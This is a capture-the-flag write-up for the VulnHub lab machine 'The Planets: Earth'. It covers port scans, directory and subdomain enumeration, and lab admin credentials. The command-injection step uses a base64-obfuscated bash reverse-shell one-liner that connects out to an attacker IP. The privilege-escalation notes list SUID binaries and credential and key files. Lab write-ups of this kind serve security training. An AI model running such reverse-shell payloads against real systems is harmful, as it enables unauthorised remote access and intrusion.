# The Planets: Earth

{% embed url="https://www.vulnhub.com/entry/the-planets-earth,755/" %}

#### Description

[Back to the Top](https://www.vulnhub.com/entry/the-planets-earth,755/#top)

Difficulty: Easy

Earth is an easy box though you will likely find it more challenging than "Mercury" in this series and on the harder side of easy, depending on your experience. There are two flags on the box: a user and root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware. Any questions/issues or feedback please email me at: SirFlash at protonmail.com, though it may take a while for me to get back to you.

## Information Gathering

Scanned all TCP ports:

<pre><code><strong>PORT    STATE SERVICE
</strong><strong>22/tcp  open  ssh
</strong>80/tcp  open  http
443/tcp open  https
MAC Address: 00:0C:29:E0:11:D1 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6, Linux 5.0 - 5.4
Uptime guess: 13.975 days (since Wed Apr  5 22:47:51 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b2c3fdc8b76e9217bd05624dfbee9a8 (ECDSA)
|_  256 b03c723b722126ce3a84e841ecc8f841 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_http-title: Bad Request (400)
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
| tls-alpn: 
|_  http/1.1
|_http-title: Test Page for the HTTP Server on Fedora
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Issuer: commonName=earth.local/stateOrProvinceName=Space
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-12T23:26:31
| Not valid after:  2031-10-10T23:26:31
| MD5:   4efa65d21a9e07184b5441da3712f187
|_SHA-1: 04db5b29a33f8076f16b8a1b581d6988db257651
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
MAC Address: 00:0C:29:E0:11:D1 (VMware)
</code></pre>

Enumerated UDP ports:

```
No results // filtered
```

Notes:

* 80/443 and 22 provides an entry point
* Obtained unique subdomain through certificates:

<figure><img src="../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

```
earth.local terratest.earth.local
```

* Added to /etc/hosts

## Enumeration

### Port 80 & 443 - HTTP/s (Apache httpd 2.4.51)

* Be sure to test both earth.local and terratest.earth.local

#### Directory Bruteforce

#### earth.local

```
dirsearch -u http://earth.local

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/xyconix/.dirsearch/reports/earth.local/_23-04-19_23-07-06.txt

Error Log: /home/xyconix/.dirsearch/logs/errors-23-04-19_23-07-06.log

Target: http://earth.local/

[23:07:06] Starting: 
[23:07:11] 301 -    0B  - /admin  ->  /admin/
[23:07:11] 200 -  306B  - /admin/
[23:07:11] 200 -  306B  - /admin/?/login
[23:07:11] 200 -  746B  - /admin/login
[23:07:15] 403 -  199B  - /cgi-bin/

```

#### terratest.earth

```
dirsearch -u https://terratest.earth.local

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/xyconix/.dirsearch/reports/terratest.earth.local/_23-04-19_22-20-43.txt

Error Log: /home/xyconix/.dirsearch/logs/errors-23-04-19_22-20-43.log

Target: https://terratest.earth.local/

[22:20:43] Starting: 
[22:20:44] 403 -  199B  - /.ht_wsr.txt
[22:20:44] 403 -  199B  - /.htaccess.orig
[22:20:44] 403 -  199B  - /.htaccess.bak1
[22:20:44] 403 -  199B  - /.htaccess.save
[22:20:44] 403 -  199B  - /.htaccess.sample
[22:20:44] 403 -  199B  - /.htaccess_orig
[22:20:44] 403 -  199B  - /.htaccessOLD2
[22:20:44] 403 -  199B  - /.htaccess_extra
[22:20:44] 403 -  199B  - /.htaccess_sc
[22:20:44] 403 -  199B  - /.htaccessOLD
[22:20:44] 403 -  199B  - /.htaccessBAK
[22:20:44] 403 -  199B  - /.htm
[22:20:44] 403 -  199B  - /.html
[22:20:44] 403 -  199B  - /.htpasswds
[22:20:44] 403 -  199B  - /.httr-oauth
[22:20:44] 403 -  199B  - /.htpasswd_test
[22:20:51] 403 -  199B  - /cgi-bin/
[22:20:55] 200 -   26B  - /index.html
[22:21:01] 200 -  521B  - /robots.txt
```

* We see <mark style="color:yellow;">robots.txt</mark> and <mark style="color:yellow;">.ht\_wsr.txt</mark>



#### Subdomain Enumeration

```
ffuf -u https://earth.local -H "Host: FUZZ.earth.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://earth.local
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.earth.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 110 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
```

earth.local/admin credentials: `terra:earthclimatechangebad4humans`

## Exploitation

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* Tried simply placing a bash shell but it would not accept outbound connections
* This means some sort of filtering is occuring
* Let's use a trick we remembered from an OSCP box to URL code the reverse shell locally and reproduce it on the server end

### Command Injection on earth.local/admin/

```
echo -e 'L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI2LzEzMzcgMD4mMQo=' | base64 -d | bash
```

PLACE SCREENSHOT HERE FOR PROOF

## Privilege Escalation

### Manual Enumeration

* Nothing internal is running weird

```
Sudo version 1.9.5p2

```

### Automated Enumeration

* gcc was found /usr/bin/gcc

```
══╣ Some certificates were found (out limited):
/etc/pki/ca-trust/extracted/pem/objsign-ca-bundle.pem
/etc/pki/ca-trust/source/ca-bundle.legacy.crt
/etc/pki/tls/certs/localhost.crt
/etc/ssl/earth.local.crt
1525PSTORAGE_CERTSBIN

passwd file: /var/lib/sss/mc/passwd

-rw-r--r--. 1 root root 475 Jun 30  2021 /usr/lib/firewalld/services/vnc-server.xml

-rwsr-xr-x. 1 root root 24K Oct 12  2021 /usr/bin/reset_root (Unknown SUID binary!)
-rwsr-xr-x. 1 root root 16K Sep 29  2021 /usr/sbin/grub2-set-bootflag (Unknown SUID binary!)

/var/earth_web/db.sqlite3

/etc/selinux/.config_backup
/etc/authselect/user-nsswitch.conf.bak

 -> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)
 -> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)
 -> Extracting tables from /var/earth_web/db.sqlite3 (limit 20)
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
 -> Extracting tables from /var/lib/dnf/history.sqlite (limit 20)
 -> Extracting tables from /var/lib/rpm/rpmdb.sqlite (limit 20)
 
 /etc/authselect/password-auth
/etc/pam.d/password-auth
/etc/pki/tls/private/localhost.key
/etc/ssh/earth.local.key
/etc/trusted-key.key
/etc/unbound/root.key
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/bin/tpm2_activatecredential
/usr/bin/tpm2_makecredential

/var/lib/unbound/root.key
```
